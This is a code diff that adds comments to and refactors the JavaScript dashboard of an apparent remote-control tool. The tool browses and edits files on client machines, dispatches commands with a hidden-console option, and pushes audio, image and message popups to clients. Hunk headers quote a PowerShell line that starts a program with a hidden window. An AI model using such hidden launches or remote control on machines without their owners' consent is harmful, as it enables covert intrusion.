@@ -1491,6 +1847,11 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         btn.disabled = isDrives;
     }
 
+    /**
+     * Render visual drive cards showing volume usage bars and disk capacity.
+     *
+     * @param {Array<{path: string, label: string, total: number, free: number}>} drives - Array of drives.
+     */
     function renderFtpDrivesGrid(drives) {
         const listContainer = $('ftp-file-list');
         if (!listContainer) return;
@@ -1546,6 +1907,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         listContainer.appendChild(grid);
     }
 
+    /**
+     * Render file and folder rows list with sorting, filtering, and CRUD button actions.
+     */
     function renderFtpItemsList() {
         const listContainer = $('ftp-file-list');
         if (!listContainer) return;
@@ -1567,7 +1931,7 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             return;
         }
 
-        listContainer.innerHTML = '';
+        const fragment = document.createDocumentFragment();
 
         filtered.forEach(item => {
             const row = document.createElement('div');
@@ -1629,10 +1993,19 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
                 };
             }
 
-            listContainer.appendChild(row);
+            fragment.appendChild(row);
         });
+
+        listContainer.innerHTML = '';
+        listContainer.appendChild(fragment);
     }
 
+    /**
+     * Handle single-click selection on an FTP table row.
+     *
+     * @param {object} item - Clicked item object.
+     * @param {HTMLElement} rowEl - Row HTML element.
+     */
     function onFtpRowClick(item, rowEl) {
         if (item.is_dir) {
             const sep = ftpState.currentPath.endsWith('\\') ? '' : '\\';
@@ -1649,6 +2022,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         openFilePreview(item, fullPath);
     }
 
+    /**
+     * Fetch file preview from remote agent and display in the slide-out preview drawer.
+     *
+     * @param {object} item - File object.
+     * @param {string} fullPath - Full filesystem path.
+     */
     async function openFilePreview(item, fullPath) {
         const drawer = $('ftp-preview-drawer');
         if (!drawer) return;
@@ -1733,6 +2112,11 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Switch preview drawer between read-only code display and interactive text editor.
+     *
+     * @param {boolean} editing - True to enable editor mode.
+     */
     function toggleFtpEditMode(editing) {
         ftpState.isEditing = editing;
         const pre = $('ftp-preview-code-content')?.parentElement;
@@ -1752,6 +2136,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         if (saveBtn) saveBtn.style.display = editing ? 'inline-flex' : 'none';
     }
 
+    /**
+     * Save edited file content back to client machine via REST API.
+     */
     async function doFtpSaveFile() {
         if (!ftpState.previewData) return;
         const editor = $('ftp-preview-editor');
@@ -1814,6 +2201,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Render customized prompt/confirmation dialog modal for FTP operations.
+     *
+     * @param {{title: string, msg?: string, value?: string, isConfirm?: boolean, isDanger?: boolean}} options - Dialog configuration.
+     * @returns {Promise<{confirmed: boolean, value: string}>} Result promise.
+     */
     function showFtpDialog({ title, msg = '', value = '', isConfirm = false, isDanger = false }) {
         return new Promise(resolve => {
             const overlay = $('ftp-dialog-overlay');
@@ -1892,6 +2285,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         });
     }
 
+    /**
+     * Create new directory in currently browsed remote directory.
+     */
     async function doFtpMkdir() {
         if (ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives') {
             alert('Please select a drive first before creating folders.');
@@ -1927,6 +2323,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Create new blank text file in currently browsed remote directory.
+     */
     async function doFtpNewFile() {
         if (ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives') {
             alert('Please select a drive first before creating files.');
@@ -1963,6 +2362,11 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Upload one or more local files to the client's current directory.
+     *
+     * @param {FileList|null} files - FileList from file input or drag-and-drop.
+     */
     function handleFtpFileUpload(files) {
         if (!files || !files.length) return;
         if (ftpState.currentPath === 'drives' || ftpState.currentPath === 'Drives') {
@@ -2012,6 +2416,11 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         });
     }
 
+    /**
+     * Delete selected remote file or folder.
+     *
+     * @param {object} item - Item object to delete.
+     */
     async function doFtpDelete(item) {
         const isDir = item.is_dir;
         const { confirmed } = await showFtpDialog({
@@ -2048,6 +2457,11 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Rename selected remote file or folder.
+     *
+     * @param {object} item - Item object to rename.
+     */
     async function doFtpRename(item) {
         const isDir = item.is_dir;
         const { confirmed, value: newName } = await showFtpDialog({
@@ -2084,6 +2498,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Hook window popstate event to support browser back button and mobile native swipe-back gestures in FTP explorer.
+     */
     function setupFtpHistoryListener() {
         window.addEventListener('popstate', e => {
             if (!ftpState.isOpen) return;
@@ -2105,6 +2522,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         });
     }
 
+    /**
+     * Copy currently loaded file preview content to system clipboard.
+     */
     function copyFtpPreviewContent() {
         if (!ftpState.previewData) return;
         const text = ftpState.previewData.content || '';
@@ -2119,6 +2539,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         });
     }
 
+    /**
+     * Download currently previewed remote file directly through the browser.
+     */
     function downloadFtpPreviewFile() {
         if (!ftpState.previewData) return;
         const data = ftpState.previewData;
@@ -2146,6 +2569,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         setTimeout(() => URL.revokeObjectURL(url), 1000);
     }
 
+    /**
+     * Update the bottom status bar indicators in the FTP modal.
+     */
     function updateFtpStatusBar() {
         const left = $('ftp-status-left');
         const right = $('ftp-status-path');
@@ -2163,6 +2589,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Wire up all event listeners for the FTP browser subsystem.
+     */
     function initFtpBrowser() {
         $('ftp-close-btn')?.addEventListener('click', () => closeFtpBrowser(true));
         $('ftp-refresh-btn')?.addEventListener('click', () => loadFtpPath(ftpState.currentPath, false));
@@ -2170,14 +2599,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             if (ftpState.parentPath) loadFtpPath(ftpState.parentPath, true);
         });
 
-        // Preview actions
         $('ftp-preview-close')?.addEventListener('click', () => closeFtpPreview(true));
         $('ftp-preview-edit')?.addEventListener('click', () => toggleFtpEditMode(true));
         $('ftp-preview-save')?.addEventListener('click', doFtpSaveFile);
         $('ftp-preview-copy')?.addEventListener('click', copyFtpPreviewContent);
         $('ftp-preview-download')?.addEventListener('click', downloadFtpPreviewFile);
 
-        // CRUD Toolbar actions
         $('ftp-mkdir-btn')?.addEventListener('click', doFtpMkdir);
         $('ftp-newfile-btn')?.addEventListener('click', doFtpNewFile);
         $('ftp-upload-btn')?.addEventListener('click', () => $('ftp-file-input')?.click());
@@ -2190,7 +2617,6 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             });
         }
 
-        // Search / Filter
         const filterInput = $('ftp-filter-input');
         if (filterInput) {
             filterInput.addEventListener('input', e => {
@@ -2215,13 +2641,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             if (e.target === $('ftp-modal')) closeFtpBrowser(true);
         });
 
-        // Browser back/forward & mobile native swipe back support (like usbftp)
         setupFtpHistoryListener();
     }
 
-    // ═══════════════════════════════════════════════════════════════
-    // OPERATIONS LOG MODULE
-    // ═══════════════════════════════════════════════════════════════
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 13: OPERATIONS AUDIT LOGGING SUBSYSTEM
+    // ═══════════════════════════════════════════════════════════════════════════
 
     const logsState = {
         isOpen: false,
@@ -2233,6 +2658,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
     };
     let logsHistoryPushed = false;
 
+    /**
+     * Format timestamp for log entries into compact YYYY-MM-DD HH:MM:SS.
+     *
+     * @param {string} timeStr - Timestamp string.
+     * @returns {string} Formatted string.
+     */
     function formatLogTime(timeStr) {
         if (!timeStr) return '—';
         try {
@@ -2248,6 +2679,11 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Open the operations audit log modal for a specific user.
+     *
+     * @param {object} [user] - Target user record.
+     */
     function openLogsModal(user) {
         const targetUser = user || runState.popupUser;
         if (!targetUser) return;
@@ -2282,6 +2718,11 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         loadUserLogs(targetUser.username);
     }
 
+    /**
+     * Close the operations audit log modal.
+     *
+     * @param {boolean} [pushHistory=false] - True if closing via user back action.
+     */
     function closeLogsModal(pushHistory = false) {
         if (!logsState.isOpen) return;
         logsState.isOpen = false;
@@ -2298,6 +2739,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Fetch operations log records for a client from the REST API.
+     *
+     * @param {string} username - Client username.
+     * @param {boolean} [silent=false] - True to suppress loading spinner.
+     */
     async function loadUserLogs(username, silent = false) {
         if (!username) return;
         const targetUser = logsState.user;
@@ -2391,6 +2838,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Render the filtered log entries list into the audit logs modal.
+     */
     function renderLogsList() {
         const list = $('logs-list');
         const counter = $('logs-counter');
@@ -2470,6 +2920,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         });
     }
 
+    /**
+     * Clear all recorded audit logs for the current client.
+     */
     async function clearUserLogs() {
         const user = logsState.user;
         if (!user) return;
@@ -2498,6 +2951,11 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Append incoming real-time operation log broadcast over WebSocket.
+     *
+     * @param {object} data - New operation log object.
+     */
     function handleRealtimeLog(data) {
         if (!data || !data.username) return;
         if (logsState.isOpen && logsState.user && logsState.user.username === data.username) {
@@ -2508,6 +2966,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Wire up event listeners for the Operations Audit Logs modal.
+     */
     function initLogsModal() {
         $('logs-close-btn')?.addEventListener('click', () => closeLogsModal(true));
         $('logs-refresh-btn')?.addEventListener('click', () => {
@@ -2553,7 +3014,13 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         });
     }
 
-    // ── Send Command / Fetch Data ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 14: COMMAND DISPATCH & API EXECUTION
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /**
+     * Dispatch confirmed command, speech synthesis, message popup, image popup, or audio blast.
+     */
     async function doSendPopup() {
         if (isSendingCommand) return;
         const user = runState.popupUser;
@@ -2670,11 +3137,19 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * View audit log records for target client.
+     *
+     * @param {object} user - Target user object.
+     */
     async function doViewOutput(user) {
         if (!user) return;
         openLogsModal(user);
     }
 
+    /**
+     * Poll client list from backend REST API and update grid if data signature changed.
+     */
     async function fetchData() {
         if (!runState.isConnected || runState.fetchInFlight) return;
         initDashboardSocket();
@@ -2696,7 +3171,11 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
-    // ── Visibility ──
+    /**
+     * Update target client's console window visibility flag (visible or hidden).
+     *
+     * @param {boolean} nextVisible - True for visible, False for hidden.
+     */
     async function setPopupVisibility(nextVisible) {
         if (runState.popupMode !== 'cmd' || !runState.popupUser) return;
         runState.selectedVis = !!nextVisible;
@@ -2718,7 +3197,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         } catch {}
     }
 
-    // ── Tab Autofill Hints ──
+    /**
+     * Synchronize display state of the Tab autofill and unfocus badges on modal textarea.
+     */
     function syncTabHint() {
         const ta = $('popup-input');
         const wrap = $('textarea-wrap');
@@ -2729,6 +3210,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         if ($('tab-unfocus-hint')) $('tab-unfocus-hint').style.display = focused ? 'flex' : 'none';
     }
 
+    /**
+     * Autofill the active modal textarea with default/sample snippet on Tab press.
+     */
     function autofillPopupInput() {
         const ta = $('popup-input');
         if (!ta || ta.value !== '') return;
@@ -2739,18 +3223,44 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         syncTabHint();
     }
 
+    /**
+     * Blur the modal textarea input.
+     */
     function unfocusPopupInput() {
         $('popup-input')?.blur();
         syncTabHint();
     }
 
-    // ── Initialization & Event Listeners ──
+    // ═══════════════════════════════════════════════════════════════════════════
+    // BLOCK 15: APPLICATION BOOTSTRAP, GLOBAL EVENT DELEGATION & HOTKEYS
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /**
+     * Open the responsive slide-out drawer sidebar.
+     */
+    function openSidebar() {
+        if (window.__getCurrentMode?.() === 'frames' && window.__framesMenuDisabled) return;
+        $('sidebar')?.classList.add('open');
+        $('sidebarOverlay')?.classList.add('open');
+    }
+
+    /**
+     * Close the responsive slide-out drawer sidebar.
+     */
+    function closeSidebar() {
+        $('sidebar')?.classList.remove('open');
+        $('sidebarOverlay')?.classList.remove('open');
+    }
+
+    /**
+     * Main application initialization routine.
+     */
     function init() {
         applyTheme(runState.themeSelection);
         setConnectionState(false);
         sizeActionModeDropdown();
 
-        // Theme dropdown
+        // Theme dropdown handling
         const themeBtn = $('run-theme-btn');
         const themeMenu = $('runThemeMenu');
         if (themeBtn && themeMenu) {
@@ -2773,7 +3283,7 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             });
         }
 
-        // Connect / disconnect buttons
+        // Connection trigger button listeners
         const handleConnect = () => {
             if (runState.isConnected) {
                 if (!confirm('Disconnect now?')) return;
@@ -2784,14 +3294,14 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         };
         ['run-connect-btn', 'sidebar-connect-btn'].forEach(id => $(id)?.addEventListener('click', handleConnect));
 
-        // Sidebar theme buttons
+        // Sidebar theme triggers
         document.querySelectorAll('.sidebar-theme-btn').forEach(btn => {
             if (btn.dataset.themeVal) {
                 btn.addEventListener('click', () => applyTheme(btn.dataset.themeVal));
             }
         });
 
-        // Sidebar action mode buttons
+        // Sidebar action mode triggers
         document.querySelectorAll('#sidebar-mode-list .sidebar-theme-btn').forEach(btn => {
             btn.addEventListener('click', () => {
                 if (!runState.popupUser) return;
@@ -2800,31 +3310,21 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             });
         });
 
-        // Sidebar download
+        // Sidebar download current frame button
         $('sidebar-download-btn')?.addEventListener('click', async () => {
             if (FramesApp?.downloadCurrentFrame) await FramesApp.downloadCurrentFrame();
             closeSidebar();
         });
 
-        // Sidebar open / close
-        const sidebar = $('sidebar');
-        const overlay = $('sidebarOverlay');
-        function openSidebar() {
-            if (window.__getCurrentMode?.() === 'frames' && window.__framesMenuDisabled) return;
-            sidebar?.classList.add('open');
-            overlay?.classList.add('open');
-        }
-        function closeSidebar() {
-            sidebar?.classList.remove('open');
-            overlay?.classList.remove('open');
-        }
+        // Hamburger drawer triggers
         $('hamburgerBtn')?.addEventListener('click', openSidebar);
-        overlay?.addEventListener('click', closeSidebar);
+        $('sidebarOverlay')?.addEventListener('click', closeSidebar);
         $('sidebarClose')?.addEventListener('click', closeSidebar);
 
+        // Periodic background poll
         setInterval(fetchData, 10000);
 
-        // Grid interactions
+        // Grid user card mouse interactions
         const grid = $('user-grid');
         if (grid) {
             grid.addEventListener('mousemove', e => {
@@ -2858,7 +3358,7 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             });
         }
 
-        // Target dropdown
+        // Target client switch menu
         $('popup-target-label')?.addEventListener('click', e => {
             e.stopPropagation();
             if (!runState.popupUser) return;
@@ -2870,7 +3370,7 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             if (!$('actionTargetWrap')?.contains(e.target)) closeTargetDropdown();
         });
 
-        // Action mode dropdown
+        // Action mode switch menu
         $('action-mode-btn')?.addEventListener('click', e => {
             e.stopPropagation();
             if (!runState.popupUser) return;
@@ -2928,7 +3428,7 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             updateOptionsUI();
         });
 
-        // Global keyboard shortcuts
+        // Global hotkey shortcuts
         document.addEventListener('keydown', e => {
             if (logsState.isOpen) {
                 if (e.key === 'Escape') {
@@ -3186,7 +3686,7 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             });
         }
 
-        // Paste support for Imager and Audio
+        // Global paste listener for Imager and Audio clips
         window.addEventListener('paste', e => {
             if (runState.popupMode === 'imager') {
                 const items = e.clipboardData?.items;
@@ -3250,9 +3750,18 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
-    return { init };
+    return {
+        init,
+        openPopup,
+        closePopup,
+        openLogsModal,
+        closeLogsModal,
+        openFtpBrowser,
+        closeFtpBrowser
+    };
 })();
 
+// Bootstrap application on DOM ready
 document.addEventListener('DOMContentLoaded', () => {
     RunApp.init();
 });
